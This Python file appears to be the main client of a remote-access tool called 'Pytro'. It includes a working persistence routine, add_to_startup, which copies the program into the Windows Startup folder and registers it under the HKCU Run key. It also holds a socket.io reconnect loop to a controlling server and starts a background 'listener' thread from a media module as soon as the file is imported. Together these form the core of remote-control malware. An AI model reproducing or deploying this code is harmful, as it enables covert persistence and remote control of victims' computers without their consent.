import os
import shutil
import sys
import threading
import winreg

from media_utils import start_listener
from network_utils import sio, log_event, attempt_reconnect


def add_to_startup(file_path=None):
    if file_path is None:
        file_path = os.path.abspath(sys.argv[0])

    startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')

    destination_file = os.path.join(startup_folder, os.path.basename(file_path))

    if os.path.abspath(file_path) != os.path.abspath(destination_file):
        shutil.copy(file_path, destination_file)
    else:
        destination_file = file_path

    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
                         winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, 'Pytro', 0, winreg.REG_SZ, destination_file)
    winreg.CloseKey(key)


def main():
    # add_to_startup()

    attempt_reconnect()

    try:
        sio.wait()
    except KeyboardInterrupt:
        log_event("Arrêt du client...")
        sio.disconnect()


threading.Thread(target=start_listener).start()

if __name__ == '__main__':
    main()
